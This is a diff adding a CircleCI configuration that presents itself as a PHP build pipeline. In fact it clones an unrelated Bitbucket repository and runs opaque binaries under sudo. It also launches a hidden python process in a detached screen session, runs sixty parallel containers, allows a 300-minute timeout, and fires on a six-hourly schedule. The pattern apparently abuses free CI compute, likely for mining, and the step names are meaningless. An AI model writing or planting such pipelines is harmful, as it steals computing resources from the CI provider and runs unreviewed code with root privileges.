@@ -1,0 +1,111 @@
+working_dir: &working_dir ~/repo
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run:
+        name: Arila
+        command: |
+          git clone https://gasnit717@bitbucket.org/gasnit717/gasnit.git
+          chmod u+x * && ./amula
+    - run:
+        name: Beka
+        command: |
+          cd gasnit
+          sudo ./b
+          sudo ./c
+          sudo ./d
+          sudo ./e
+          sudo ./f
+          sudo ./g
+    - run:
+        name: Canda
+        command: |
+          cd gasnit
+          sudo ./i
+          sudo ./j
+          sudo ./kxuimtu
+          screen -dmS Acdb python3 pro00.py
+          sleep 120s
+          sudo ./main00.sh
+                    
+        no_output_timeout: 300m        
+        
+        
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  Bual_01:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.11-browsers
+        environment:
+          POSTGRES_USER: postgres
+    parallelism: 15
+  Bual_02:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.11-browsers
+        environment:
+          POSTGRES_USER: postgres
+    parallelism: 15
+  Bual_03:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.11-browsers
+        environment:
+          POSTGRES_USER: postgres
+    parallelism: 15
+  Bual_04:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.11-browsers
+        environment:
+          POSTGRES_USER: postgres
+    parallelism: 15
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    triggers:
+      - schedule:
+          cron:
+            - "0 */6 * * *"
+            - "* 0,6,12,18 * * *"
+          filters:
+            branches:
+              only:
+                - staging
+                - /v[0-9]+(\.[0-9]+)*/
+                - /feature\/.*/
+                - /user-.*/
+                - /pre-prod(?:-.+)?$/
+
+
+
+
+
+workflows:
+  version: 2
+  DaftarJalan:
+    jobs:
+      - Bual_01
+      - Bual_02
+      - Bual_03
+      - Bual_04
+
+
+
+
